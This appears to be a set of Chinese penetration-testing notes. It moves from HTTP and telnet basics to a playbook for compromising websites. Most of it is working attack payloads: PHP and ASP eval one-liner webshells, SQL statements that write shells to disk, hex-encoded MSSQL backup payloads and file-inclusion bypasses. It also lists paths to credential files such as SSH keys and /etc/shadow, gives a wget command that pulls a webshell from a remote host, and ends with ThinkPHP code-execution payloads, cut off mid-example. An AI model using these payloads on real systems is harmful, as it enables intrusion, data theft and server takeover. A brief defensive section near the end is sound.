#HTTP协议简介
---
##HTTP请求的格式

		1）请求信息：例如“Get /index.php HTTP/1.1”，请求index.php文件

		2）表头：例如“Host: localhost”，表示服务器地址

		3）空白行

		4）信息正文

		“请求信息”和“表头”都必须使用换行字符（CRLF）来结尾，空白行只能包含换行符，不可以有其他空格符。

		下面例子发送HTTP请求给服务器www.yhsafe.com

		GET /index.php HTTP/1.1↙        //请求信息   

		Host:www.yhsafe.com↙      //表头
		↙                                                     //空格行
		↙
			↙符号表示回车键，在空白行之后还要在按一个空格才会发送HTTP请求，HTTP请求的表头中只有Host表头是必要的饿，其余的HTTP表头则是根据HTTP请求的内容而定。
		 
##HTTP请求的方法
		1）GET：请求响应
		2）HEAD：与GET相同的响应，只要求响应表头
		3）POST：发送数据给服务器处理，数据包含在HTTP信息正文中
		4）PUT：上传文件
		5）DELETE：删除文件
		6）TRACE：追踪收到的请求
		7）OPTIONS：返回服务器所支持的HTTP请求的方法
		8）CONNECT：将HTTP请求的连接转换成透明的TCP/IP通道
		 
##HTTP响应的格式
		服务器在处理完客户端所提出的HTTP请求后，会发送下列响应。
		1）第一行是状态码
		2）第二行开始是其他信息
		状态码包含一个标识状态的数字和一个描述状态的单词。例如：
		HTTP/1.1 200 OK
		200是标识状态的是数字，OK则是描述状态的单词，这个状态码标识请求成功。

##HTTP请求和响应的例子

		打开cmd输入telnet，输入open www.00aq.com 80

		打开连接后输入
			ctrl+]开启回显
			GET /index.php HTTP/1.1↙      
			Host:www.00aq.com↙  
##telnet简介
http://blog.csdn.net/bulelemon/article/details/50437780

####win7或者win8下默认是没有打开telnet功能的，需要手动启用：
打开“控制面板”，找到“程序和功能”，然后点击左边栏目中的“打开或关闭windows功能”，选择后会弹出windows功能的对话框，这个对话框里面有许多windows的小功能，我们再找到TelentClient（telent客户端），打上勾，确认即可！仅仅需要连接其他地方的话，只启用telnet客户端就可以了。

####启用telnet回显功能
在用telnet 连接某域名后输入任何东西都是不显示的，很不方便，开启之后就可以看到了

	首先进入命令行界面(也就是cmd)：
		telnet
		set ?
		localecho //打开localecho
		set localecho//系统会提示本地回显启用
		quit//退出
	
	我先把本地启动一个Apache做为测试
	然后命令行下输入：telnet localhost 80
	然后ctrl+]，接下来什么也不要输入直接回车，然后再输入命令就可以看到回显了

####参数与帮助
按回车后进入Microsoft Telnet>命令提示符下：

	输入？或者 help

出现如下信息：

	c    - close     关闭当前连接
	d    - display                    显示操作参数
	o    - open hostname [port]         连接到主机(默认端口 23）。
	q    - quit                      退出 telnet
	set - set                       设置选项(键入 'set ？'获得列表）
	sen - send                       将字符串发送到服务器
	st - status                     打印状态信息
	u - unset                      解除设置选项(键入'set ?'获得列表）
	?/h - help                         打印帮助信息

根据提示信息，输入：set ?
获得了部分列表

	bsasdel          Backspace 键作为删除
	crlf            新行模式 - 引起 return 键发送 CR 和 LF
	delasbs          发送 Delete 键作为退格
	escape x          x 是进入 telnet 客户端提示的 escape 字符
	localecho         打开 localecho 即回显功能
	logfile x         x 是当前客户端的日志文件
	logging          启用日志
	mode x           x 是控制台或流
	ntlm            启用 NTLM 身份验证
	term x           x 是 ansi、vt100、vt52 或 vtnt(& )

#拿到一个网站思维导图

	信息搜集
		扫描工具:wvs,wwwscan,御剑，nmap,旁站，端口，社工，搜索引擎
		内容：ip,端口，目录，后台，重要文件泄露，旁站，社工信息泄露，网站链接及页面
		临时文件泄露，错误日志，数据库文件，robots.txt,系统配置文件，代码执行eval,经验社工
	注入点检测与渗透
		手工：是否存在注入点，数据库信息，用户权限，数据库路径和内容
		工具：；sqlmap，pangolin，haviji,阿迪，明小子
		
	管理员后台探测
		搜索引擎，扫描工具，文件泄漏，经验，自动跳转漏洞
		
	管理员登录
		sql注入，xss,社工，爆破，万能密码，session/cookie欺骗,伪造IP
		
	getshell
		管理员后台getshell
		文件包含getshell
		命令执行
		远程命令执行exp
		
	提权
		Windows、Linux
	
	内网渗透
		ipc$
		

sql注入
{
	
}



获取webshell思路
{
	1.直接上传webshell
	{
	这种对php和jsp的一些程序比较常见，MolyX BOARD就是其中一例，直接在心情图标管理上传。php类型，虽然没有提示，其实已经成功了，上传的文 件url应该是http://forums/images/smiles/下，前一阵子的联众游戏站和网易的jsp系统漏洞就可以直接上传jsp文件。文 件名是原来的文件名，bo-blog后台可以可以直接上传。php文件，上传的文件路径有提示。以及一年前十分流行的upfile.asp漏洞（动网 5.0和6.0、早期的许多整站系统），因过滤上传文件不严，导致用户可以直接上传webshell到网站任意可写目录中，从而拿到网站的管理员控制权 限。
	}
	2.在管理员后台修改上传类型，之后上传webshell
	{
		现在很多的脚本程序上传模块不是只允许上传合法文件类型，而大多数的系统是允许添加上传类型，bbsxp后台可以添加asa|asP类 型，ewebeditor的后台也可添加asa类型，通过修改后我们可以直接上传asa后缀的webshell了，还有一种情况是过滤了。asp，可以添 加。aspasp的文件类型来上传获得webshell.php系统的后台，我们可以添加。php.g1f的上传类型，这是php的一个特性，最后的哪个 只要不是已知的文件类型即可，php会将php.g1f作为。php来正常运行，从而也可成功拿到shell.LeadBbs3.14后台获得 webshell方法是：在上传类型中增加asp ，注意，asp后面是有个空格的，然后在前台上传ASP马，当然也要在后面加个空格！
	}
	3.上传图片或其他变种一句话，之后文件包含
	
	4.sql语句写入一句话
	{
		后台需要有mysql数据查询功能，我们就可以利用它执行SELECT …… INTO OUTFILE查询输出php文件，因为所有的数据是存放在mysql里的，所以我们可以通过正常手段把我们的webshell代码插入mysql在利用 SELECT …… INTO OUTFILE语句导出shell.在mysql操作里输入select 0x3C3F6576616C28245F504F53545B615D293B3F3E from mysql.user into outfile '路径‘ 就可以获得了一个<？eval（$_POST[a]）；？>的最小马' 0x3C3F6576616C28245F504F53545B615D293B3F3E 是我们<？eval（$_POST[a]）；？>的十六进制，这种方法对phpmyadmin比较普遍，先利用phpmyadmin的路径泄 露漏洞，比较典型的 是http://url/phpmyadmin/libraries/select_lang.lib.php.

		就可以暴出路径，php环境中比较容易暴出绝对路径：）。提一点的是遇到是mysql在win系统下路径应该这样写d：\\wwwroot \\a.php.下面的方法是比较常用的一个导出webshell的方法，也可以写个vbs添加系统管理员的脚本导出到启动文件夹，系统重起后就会添加一 个管理员帐号CREATE TABLE a（cmd text NOT NULL）

		INSERT INTO a（cmd） VALUES（'<？fputs（fopen（"./a.php"，"w"），"<？eval（\$_POST[a]）；？>"）？>'）

		select cmd from a into outfile '路径/b.php' DROP TABLE IF EXISTS a访问b.php就会生成一个<？eval（$_POST[a]）；？>的最小马。

		如果遇到可以执行php命令就简单多了，典型的代表是BO-BLOG，在后台的php命令框输入以下代码：

		<？$sa = fopen（"./up/saiy.php"，"w"）；fwrite（$sa，"<？eval（\$_POST[a]）；？".">"）；fclose（$sa）；？>

		就会在up目录下生成文件名为saiy.php内容为<？eval（$_POST[a]）；？>的最小php木马，最后用lanker 的客户端来连接。实际运用中要考虑到文件夹是否有写权限。或者输入这样的代 码<？fputs（fopen（"./a.php"，"w"），"<？eval（\$_POST[a]）；？>"）？> 将会在当前目录生成一个a.php的最小马。
	}
	5.备份恢复数据库为一句话
	{
		主要是利用后台对access数据库的“备份数据库”或“恢复数据库”功能，“备份的数据库路径”等变量没有过滤导致可以把任意文件后缀改 为asp，从而得到webshell，msssql版的程序就直接应用了access版的代码，导致sql版照样可以利用。还可以备份网站asp文件为其 他后缀 如。txt文件，从而可以查看并获得网页源代码，并获得更多的程序信息增加获得webshell的机会。在实际运用中经常会碰到没有上传功能的时 候，但是有asp系统在运行，利用此方法来查看源代码来获得其数据库的位置，为数据库插马来创造机会，动网论坛就有一个ip地址的数据库，在后台的ip管 理中可以插入最小马然后备份成。asp文件即可。在谈谈突破上传检测的方法，很多asp程序在即使改了后缀名后也会提示文件非法，通过在。asp文件头加 上gif89a修改后缀为gif来骗过asp程序检测达到上传的目的，还有一种就是用记事本打开图片文件，随便粘贴一部分复制到asp木马文件头，修改 gif后缀后上传也可以突破检测，然后备份为。asp文件，成功得到webshell.
	}
	6.利用数据库压缩功能
	{
		可以将数据的防下载失效从而使插入数据库的最小马成功运行，比较典型的就是loveyuki的L-BLOG，在友情添加的url出写 上<%eval request （chr（35））%>， 提交后，在数据库操作中压缩数据库，可以成功压缩出。asp文件，用海洋的最小马的eval客户端连就得到一个webshell.
	}
	
	7.插入配置文件写一句话
	{
		
	}
	
	8.利用后台管理功能写入webshell
	{
		直接修改cms模板文件，或写入友情链接，从而写入webshell
	
	]
	
	9.差异上传
	{
		这里需要提一点动网mssql版，但是可以直接本地提交来备份的。首先在发帖那上传一个写有asp代码的假图片，然后记住其上传路径。写一个本地提 交的表单，
		代码如下：
			<form action=http://网站/bbs/admin_data.asp？action=RestoreData&act=Restore method="post"> 
				<p>已上传文件的位置：<input name="Dbpath" type="text" size="80"></p> <p>要复制到的位置：<input name="backpath" type="text" size="80"></p> <p><input type="submit" value="提交"></p> 
			</form>
			另存为。htm本地执行。把假图片上传路径填在“已上传文件的位置”那里，想要备份的WebShell的相对路径填写在“要复 制到的位置”那里，提交就得到我们可爱的WebShell了，恢复代码和此类似，修改相关地方就可以了。没有遇到过后台执行mssql命令比较强大的 asp程序后台，动网的数据库还原和备份是个摆设，不能执行sql命令备份webshell，只能执行一些简单的查询命令。可以利用mssql注入差异备 份webshell，一般后台是显示了绝对路径，只要有了注入点基本上就可以差异备份成功。下面是差异备份的主要语句代码，利用动网7.0的注入漏洞可以 用差异备份一个webshell，可以用利用上面提到的方法，将conn.asp文件备份成。txt文件而获得库名。
		差异备份的主要代码：
			；declare @a sysname，@s varchar（4000） select @a=db_name（），@s=0x626273 backup database @a to disk=@s——
			；Drop table [heige]；create table [dbo].[heige] （[cmd] [image]）——
			；insert into heige（cmd） values（0x3C2565786563757465207265717565737428226C2229253E）——
			；declare @a sysname，@s varchar（4000） select @a=db_name（），@s=0x643A5C7765625C312E617370 backup database @a to disk=@s WITH DIFFERENTIAL，FORMAT——这段代码中，0x626273是要备份的库名bbs的十六进制，可以是其他名字比如bbs.bak； 0x3C2565786563757465207265717565737428226C2229253E是<%execute request（"l"）%>的十六进制，是lp最小马；0x643A5C7765625C312E617370是d：\web\1.asp的十六 进制，也就是你要备份的webshell路径。当然也可以用比较常见备份方式来获得webshell，唯一的不足就是备份后的文件过大，如果备份数据库中 有防下载的的数据表，或者有错误的asp代码，备份出来的webshell就不会成功运行，利用差异备份是成功率比较高的方法，并且极大的减少备份文件的 大小。
	}
	
	10.phpwind论坛从后台到webshell的三种方式
	{
		方式1 模板法进入后台， 风格模版设置 ，在随便一行写代码，记住，这代码必须顶着左边行写，代码前面不可以有任何字符。

		EOT；eval（$a）；print <<<EOT而后得到一个shell为http://网站/bbs/index.php.
		方式2 脏话过滤法进入安全管理 ◇ 不良词语过滤。新增不良词语写 //      a‘]=’aa‘；eval（$_POST[’a‘]）；//

		替换为那里可以随意写，而后得到一个shell地址为http://网站/bbs/data/bbscache/wordsfb.php.

		方式3 用户等级管理新建立会员组，头衔你可以随便写，但是千万不要写单双引号特殊符号，升级图片号写a‘；eval（$_POST[’a‘]）；// ，升级点数依然可以随意写。而后得到一个shell地址为http://网站/bbs/data/bbscache/level.php.以上三种方式得 到webshellr的密码是a，为lanker的一句话后门服务端。
	}
	
	11.利用网站访问计数系统记录来获取webshell
	{
		最明显的就是某私服程序内的阿江计数程序，可以通过http://网站/stat.asp？style=text&referer= 代码内容&screenwidth=1024直接提交， 即可把代码内容直接插入到计数系统的数据库中，而此系统默认数据库为count#.asa，我们可以通过http://网站/count%23.asa访 问得到webshell，由于阿江计数程序过滤了%和+，将最小马改成<SCRIPT RUNAT=SERVER LANGUAGE=vbSCRIPT>eval（Request（"1"））</SCRIPT>替换代码内容处提交，然后用lake2 的eval客户端来提交，值得一提的是如果进到计数后台，可以清理某时某刻的数据，一旦插入asp木马失败，可以清理数据库再次操作。
	}
	
	12.利用任意代码执行漏洞
	{
		
	}
	13.利用任意命令执行漏洞
	{
		
	}
}



#文件包含
##原理：
	文件包含漏洞是“代码注入”的一种。
	其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。
	“代码注入”的典型代表就是文件包含。
	文件包含漏洞可能出现在JSP、PHP、ASP等语言中，原理都是一样的，本文只介绍PHP文件包含漏洞。
	
##特点：
	包含即执行,有时也包括文件内容的读取

	
##用途：
	本地文件包含漏洞可以查看系统任意文件内容，如果具备一些条件，也可以执行命令
	/etc/password
	phpinfo
	一句话
	大马
	cmdshell
	
##利用条件：
	1. Web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件;
	2. 用户能够控制该动态变量的值

	
	文件包含的函数
	{
		include():当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。
		include_once():功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。
		require():
			1.require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。
			2.使用require()函数包含文件时，只要程序一执行，立即调用文件，而include()只有程序执行到该函数时才调用。
			3.require() 无论如何都会包含文件，而include() 可以有选择地包含：
		require_once():它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。
	}
	
	原理演示
	{
		<?php 
			$filename=$_GET['filename'];
			include($filename);
		?>			
	}
	
	文件包含类型总结
	{
		1.本地文件包含（LFI）
		{
			包含用户上传的文件，执行命令，读写文件，获取webshell。
			如果用户上传的文件内容中包含PHP代码，那么这些代码被文件包含函数加载后将会被执行。
			但能否攻击成功，取决于上传功能的设计，比如需要知道上传文件存放的物理路径，还需要上传的文件有执行权限。
			<?php include("inc/" . $_GET['file']); ?>
			<?php include("inc/" . $_GET['file'] . ".htm"); ?>
		}
		2.远程文件包含（RFI）
		{
			?file=[http|https|ftp]://example.com/shell.txt
			需要allow_url_fopen和allow_url_include为ON
			攻击者可以在自己的Web服务器上放一个可执行的恶意文件，通过目标网站存在的远程文件包含漏洞来加载文件，从而实现执行任意命令的目的
			截断：%23，#，？，%00,长文件名
			demo:
				http://192.168.1.100/index.php?file=http://192.168.1.200/flag.txt
				

		}
		3.php读写文件协议
		{
			php读写文件包含
			http://blog.csdn.net/niexinming/article/details/52605144
			需要目标服务器支持，同时要求allow_url_fopen为设置为ON。在PHP5.2.0之后的版本中支持data: 伪协议，可以很方便的执行代码。
			?file=php://input
				php://input可以读取没有处理过的POST数据。相较于$HTTP_RAW_POST_DATA而言，它给内存带来的压力较小，并且不需要特殊的php.ini设置。php://input不能用于enctype=multipart/form-data
				应用场景：file_get_contents($user,'r')，将变量值作为文件名进行读取,file_get_contents() 函数把整个文件读入一个字符串中。
				
				http://192.168.1.100/index.php?file=php://input
				之后post一句话<?php eval($_POST['123']);?>getshell
				(需要allow_url_include=On，详细→http://php.net/manual/en/wrappers.php.php)
				
				
			?file=php://filter/convert.base64-encode/resource=
				php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。
				parser error : StartTag: invalid element name,在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。
				为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter
				应用场景：include($file);
				
				//读取包含有敏感信息的PHP等源文件
				http://192.168.1.100/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php 
				读取源码:基本都能用，路径被限制则失败
				
				//将POST内容转换成base64编码并输出
				readfile("php://filter/read=convert.base64-encode/resource=php://input");
				

				
			?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJzEyMyddKTs/Pg==
			//?file.name=data://text/plain;charset=unicode,hello	
				/rfi.php?file=data:text/plain,<?php%20phpinfo();?>
				<?php eval($_POST['123']);?>
				(需要allow_url_include=On)
			
				data URI scheme	，减少HTTP 请求 (http request) 的次数，让我们直接把传输文件的内容崁入请求中里面
					data - 取得数据的协定名称
					image/png - 数据类型名称
					base64 - 数据的编码方法
					iVBOR.... - 编码后的数据
					: , ; - data URI scheme 指定的分隔符号
	
			php://filter仅可以用一次，php://input可多次重复使用
				
			参考文章：
				http://www.91ri.org/7469.html
				http://hi.baidu.com/casperkid/item/2baf952b13a9cd0e76272cb0
				http://blog.csdn.net/beyond__devil/article/details/52860333
				http://www.freebuf.com/articles/web/14097.html	
				http://www.freebuf.com/articles/web/9181.html
				https://www.waitalone.cn/php-file-include.html
		}
		4.包含Session文件
		{
			需要攻击者能够控制部分Session文件的内容。PHP默认生成的Session文件一般存放在/tmp目录下
			file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7
			
		}
		
		5.包含日志文件
		{
			1)简介
				比如Web服务器的访问日志文件，这是一种通用的技巧。因为几乎所有网站都会将用户的访问记录到访问日志中。
				因此，攻击者可以向Web日志中插入PHP代码，通过文件包含漏洞来执行包含在Web日志中的PHP代码。
				如果网站访问量大的话，日志文件可能会非常大，这时如果包含一个这么大的文件时，PHP进程可能会卡死。
				一般网站通常会每天生成一个新的日志文件，因此在凌晨时进行攻击相对来说容易成功。
			2)路径
				nginx配置文件路径：../../../../opt/nginx/config/nginx.conf
				nginx日志文件路径：../../../../opt/nginx/logs/access.log
				apache:file=../../../../../../../../../usr/local/apache2/conf/httpd.conf
				
				file=.htaccess
				file=../../../../../../../../../var/lib/locate.db
				file=../../../../../../../../../var/lib/mlocate/mlocate.db
				
				/root/.ssh/authorized_keys
				/root/.ssh/id_rsa
				/root/.ssh/id_rsa.keystore
				/root/.ssh/id_rsa.pub
				/root/.ssh/known_hosts
				/etc/shadow
				/root/.bash_history
				/root/.mysql_history
				/proc/self/fd/fd[0-9]* (文件标识符)
				/proc/mounts
				/proc/config.gz
				如果有phpinfo可以包含临时文件
				
			3)在http请求的连接中直接写入一句话:get /<?php eval($_POST['123']);?>，然后菜刀连接文件包含链接
			
			4）绕过short_open_tag=off,避免urldecode，如%20
			法一：一句话base64加密后再写入
			法二：
				如果没有返回响应而WEB服务器又接受了请求，那么请求的内容将原封不动的写入WEB日志，不会进行HTTP编码.
				我们想个办法一直与WEB服务器保持TCP连接，不让WEB服务器处理响应返回，然后再由客户端的我们中断这次TCP连接.
				只要在HTTP请求的数据包中去掉Connection HTTP标头值。利用NC伪造没有Connection HTTP标头的请求包：
					GET /index< >.php HTTP/1.1
					Accept: */*
					Accept-Language: zh-cn
					Accept-Encoding: gzip, deflate
					User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
					Host: 192.168.3.44
					你会发现WEB服务器一直不会返回响应，直到我们客户端断开这次连接，这个邪恶的空格便写入了WEB日志！*/
					
			
		}
		
		6.包含/proc/self/environ文件
		{
			通用的技巧。因为它根本不需要猜测被包含文件的路径，同时用户也能控制它的内容。常见的做法是向User-Agent中注入PHP代码来完成攻击。
			这个环境变量有访问web的session信息和包含user-agent的参数。user-agent在客户端是可以修改的。
			参考：
				《Shell via LFI – proc/self/environ method》
				http://hi.baidu.com/root_exp/blog/item/9c0571fc2d42664fd7887d7d.html
		}
		
		7.XSS执行任意代码
		{
			?file=http://127.0.0.1/path/xss.php?xss=phpcode
			(需要allow_url_fopen=On，allow_url_include=On并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -)
		}
		8.zip协议
		{
			zip://C:/1.zip#1.txt  就相当于取  C:\1.zip中的1.txt
			于是使用zip://协议来构造一个../old_head.php的文件（010editor修改zip内文件名）
			depth = zip://C:/Program Files (x86)/EasyPHP-Webserver-14.1b2/www/web2/..%23
			http://10.0.0.28:888/web2/admin/admin//getpassword.php?depth=zip://C:/Program%20Files%20(x86)/EasyPHP-Webserver-14.1b2/www/web2/upload/head/2.png%23
			
		}
		9.文件系统协议file:///
		{
			文件路径必须是绝对路径
		}
	}
		
		
		
	
	
	截断与绕过
	{
		1.长文件名截断:5.2可用，5.3修复，
		.与/的组合
				././././././././././././././././passwd
				////////////////////////passwd
				../1/abc/../1/abc/../1/abc..
		目录字符串在Windows下256字节、Linux下4096字节时达到最大值，最大值长度之后的字符将被丢弃。
		2.问号'?'截断:只有在远程包含才能使用，注意本地包含无法使用，不受版本限制
		3.常规%00，%23，%2500
			%00截断：
				?file=../../../../../../../../../etc/passwd%00
				(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)
				%00截断在5.2版本可以使用，5.3及以后版本被修复，如果开启了GPC或者addslashes了，同样无法截断
			%00截断目录遍历：
				?file=../../../../../../../../../var/www/%00
				(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)
		4.路径长度截断：
			?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
			(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)
		5.点号截断：
			?file=../../../../../../../../../boot.ini/………[…]…………
			(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)
		6.编码绕过
			url编码、双层（多层）url编码
				%2e%2e%2f   解码：../
				%2e%2e%5c  解码：..\
				%25%2e%25%2e%255c 解码：..\（可使用burp多层编码和解码）
			uniclode/UTF-8编码
				..%c0%af  解码：../
				%c1%9c  解码：..\	
		适用于所有文件操作函数
		{
			fopen,copy,readfile,parse_ini_file,file_get_contents,file_put_contents,mkdir,tempnam,touch,move_uploaded_file,renam,unlink,rmdir,ZipArchive::open()
		}
	}
	
	文件包含getshell
		{
			1)使用wget之类的命令来下载一个Webshell
				这个比较简单，也很常用，在上面我们得到的那个伪webshell中，我们可以执行命令，那么我们也可以调用系统中的一个很厉害的角色，wget， 这个命令的强大你可以google下，参数一大堆，绝对搞晕你，呵呵，我们不需要那么复杂，我们就使用一个 -O（–output- document=FILE，把文档写到FILE文件中） 就可以了，呵呵。
				前提是你在按照前面的步骤放一个包含PHP代码的Webshell在一个可以通过HTTP或者FTP等可以访问的地方，比 如：http://www.xxx.cn/m4r10.txt,这个文件里写的就是Webshell的内容。然后我们在前面得到的伪 Webshell中 执行如下的URL：
				http://hi.baidu.com/m4r10/php/index.php?page=http://www.xxx.cn /cmd.txt?cmd=wgethttp://www.xxx.cn/m4r10.txt -O m4r10.php
				如果当前目录可写，就能得到 一个叫做m4r10.php的Webshell了，如果当前目录不可写，还需要想其它的办法。
			2）使用文件来创建				    	
				前面的wget可能会遇到当前目录不能写的情况；或者目标主机禁用了（或者没装）这个命令
				我们可以结合前面的包含文件漏洞来包含一个创建文件（写文件）的PHP脚本，内容如下：	
					<?php
						$f=file_get_contents(“http://www.xxx.cn/m4r10.txt”); //打开指定路径的文件流
						$ff=fopen(“./upload/m4r10.php”,”a”); //寻找一个可以的目录，创建一个文件
						fwrite ($ff,$f); 　//把前面打开的文件流写到创建的文件里
						fclose($ff); 　//关闭保存文件
					?>
					
					<?php
						$filename="test.txt";
						file_put_contents($filename, "nihao");
					?>
					
					<?php
						$filename="test.txt";
						file_put_contents($filename, json_encode("ni&hao"));
					?>

					
			3）包含同服务器中上传的jpg、txt、rar等文件
			
			4）包含系统的各种日志，如apache日志，文件系统日志等 其中apache当记录格式为combined，一般日志都会很大，基本无法包含成功。包含log是有自动化攻击程序的。
			
			5）包含由php程序本身生成的文件，缓存、模版等，开源的程序成功率大
			
			6)利用本地包含读取PHP敏感性文件，需要PHP5以上版本。如看到“config”的源码如下：
				index.php?pages=php://filter/read=convert.base64-encode/resource=config
				特别的情况用到readfile() 函数不是包含执行，可以直接读源码。
				
			7)利用phpinfo页面getshell。一般大组织的web群存在phpinfo的机会挺大的。
				poc和介绍参考：
					《利用phpinfo信息LFI临时文件》
					http://hi.baidu.com/idwar/blog/item/43101de153370126279791f2.html
					
			8)利用包含出错，或者包含有未初始化变量的PHP文件，只要变量未初始化就可能再次攻击 
				具体见：
					《include()本地文件包含漏洞随想》
					http://www.2cto.com/Article/200809/29748.html
					
			9）结合跨站使用
				index.php?pages=http://127.0.0.1/path/xss.php?xss=phpcode （要考虑域信任问题）
				
			10）包含临时文件文件。这个方法很麻烦的。
			参考：
				《POST method uploads》
				http://www.php.net/manual/en/features.file-upload.post-method.php
				解决临时文件删除方法：慢连接 （注：前提是 file_uploads = On，5.3.1中增加了max_file_uploadsphp.ini file_uploads = On，5.3.1中增加了max_file_uploads，默认最大一次上传20个）
				windows格式：win下最长4个随机字符( ‘a’-’z’, ‘A’-’Z’, ’0′-’9′）如： c:/windows/temp/php3e.tmp
				Linux格式：6个随机字符( ‘a’-’z’, ‘A’-’Z’, ’0′-’9′） 如：/tmp/phpUs7MxA
				慢连接的两种上传代码参考：
				《PHP安全之LFI漏洞GetShell方法大阅兵》
				http://www.myhack58.com/Article/html/3/62/2011/32008_2.htm
				
			11)当前实在找不到写权限目录时候，注入到log中再寻找写权限目录。
			如注入到log.
				linux: index.php?pages=/var/log/apache/logs/error_log%00&x=/&y=uname
				windows: index.php?pages=..\apache\logs\error.log%00&x=.&y=dir
			具体参考《PHP本地文件包含(LFI)漏洞利用》
				http://kingbase.org/blog/php_local_file_inclusion_exploit	
				
				
			12）php文件读写协议
			使用php wrapper例如php://input、php://filter、data://等包含文件 
			在《PHP 5.2.0 and allow_url_include》//http://blog.php-security.org/archives/45-PHP-5.2.0-and-allow_url_include.html 其中文中提到的allow_url_fopen和allow_url_include只是保护了against URL handles标记为URL.这影响了http(s) and ftp(s)但是并没有影响php或date 这些url形式。			
				
			13）LFI判断目录是否存在和列目录，
			如：
				**index.php?pages=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00
				**这个方法在TTYshell上是可以完全是可以判断的，但是在URL上有时候不可行。即使不存在dossierexistant也可以回显passwd内容。
				
				index.php?pages=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00
				**FreeBSD 《directory listing with PHP file functions》http://websec…ress.com/2009 … php-file-functions/ 列目录
				**存在逻辑判断的时候，如不存在该目录就会返回header.php+File not found+footer.php 存在就会返回header.php+footer.php。这种逻辑很符合程序员的习惯。曾经用找到了一个目录很深的日志获得shell。	
			
			14)	包含SESSION文件，php保存格式 
			sess_SESSIONID 默认位置是/tmp/(PHP Sessions)、/var/lib/php/session/(PHP Sessions)、 /var/lib/php5/(PHP Sessions) 和c:/windows/temp/(PHP Sessions)等文件中。		
				
			15)包含 /proc/self/cmdline 或者/proc/self/fd/找到log文件 （拥有者为root，默认情况要root才能访问）
			具体参考：
				Local File Inclusion – 《Tricks of the Trade》
				http://labs.neohapsis.com/2008/07/21/local-file-inclusion-%E2%80%93-tricks-of-the-trade/
			还有其他提到包含/var/log/auth.log的，但是这个文件默认情况也是644.
			
			16）包含maillog 通常位置/var/log/maillog 这个方法也很鸡肋
			具体参考：
				《local file inclusion tricks 》
				
			17）包含固定的文件，非常鸡肋，为了完整性也提下。
			如：可用中间人攻击。
				突破限制截断后面的字符串技巧
				利用本地包含时常常需要用%00来截断后面的字符串，但在GPC为ON时%00是会被转义的，那么还有其他方法么？
				用一定数量的/突破操作系统对文件名的长度限制来截断后面的字符串（推测相对路径可用）
		} 
	
	防护措施
	{			   	
		从代码层来讲，在开发过程中应该尽量避免动态的变量，尤其是用户可以控制的变量。
		一种保险的做法是采用“白名单”的方式将允许包含的文件列出来，只允许包含白名单中的文件，这样就可以避免任意文件包含的风险。
	
		将文件包含漏洞利用过程中的一些特殊字符定义在黑名单中，对传入的参数进行过滤，但这样有时会因为过滤不全，导致被有经验的攻击者绕过
	
		在Web服务器安全配置方面可以通过设定php.ini中open_basedir的值将允许包含的文件限定在某一特定目录内，这样可以有效的避免利用文件包含漏洞进行的攻击。
		需要注意的是，open_basedir的值是目录的前缀，因此假设设置如下值：open_basedir=/var/www/test，那么实际上以下目录都是在允许范围内的。
	
		php的安全配置
		{
			Register_globals =off
			Open_basedir
			Allow_url_include =off
			Display_errors =off
			Log_errors = on
			Magic_quotes_gpc =off
			Cgi.fix_pathinfo
			Session.cookie_httponly
		}
	}
	
	
	
	

}

代码执行
{
	漏洞原理
	{
当应用在调用一些能将字符串转化成代码的函数（如php中的eval）时，没有考虑到用户是否能控制这个字符串，将造成代码注入漏洞。狭义的代码注入通常指将可执行代码注入到当前页面中，如php的eval函数，可以将字符串代表的代码作为php代码执行，当前用户能够控制这段字符串时，将产生代码注入漏洞（也称命令执行）。
	}
	
	产生原因
	{
		php：   eval，assert，preg_replace()+/e模式，unserialize() (反序列化函数)
		python：   exec
		asp：<%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%>
		java：   java中没有类似php中的eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并期望有各种基于反射机制的表达式引擎，如：OGNL、SpEL等		
	}
	
	漏洞危害
	{
		执行代码  ；  上网站写shell   ；   甚至控制服务器
	}
	
	漏洞防护
	{
		使用json保存数组，当读取时就不需要使用eval了
		对于必须使用eval的地方，一定严格处理用户数据
			字符串使用单引号包括可控代码，插入前使用addslashes转义
			放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换		
			若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象
	}
	
	漏洞分类：
	{
		执行代码的函数：eval、assert
		callback函数：preg_replace + /e模式
		反序列化：unserialize()(反序列化函数)
	}
	
	操作思路
	{
	# 一般找CMS相应版本漏洞，如ThinkPHP2.1 
	* 一句话 http://www.xxx.com/News/detail/id/{${@eval($_POST[aa])}} 
	* 得到当前路径 http://www.xxx.com/News/detail/id/{${print(getcwd()))}} 
	* 读文件 http://www.xxx.com/News/detail/id/{${exit(var_dump(file_get_contents($_POST['f'])))}} 
		POST的数据为：f=/etc/passwd 
	* 写shell http://www.xxx.com/News/detail/id/{${exit(var_dump(file_put_contents($_POST['f'],$_POST[d])))}} 
		POST的数据为：f=1.php&d=<?php @eval($_POST['aa'])?>
	}
	
	示例
	{
		1）直接传入函数
	demo:
		<?php
		$data = $_GET['data'];
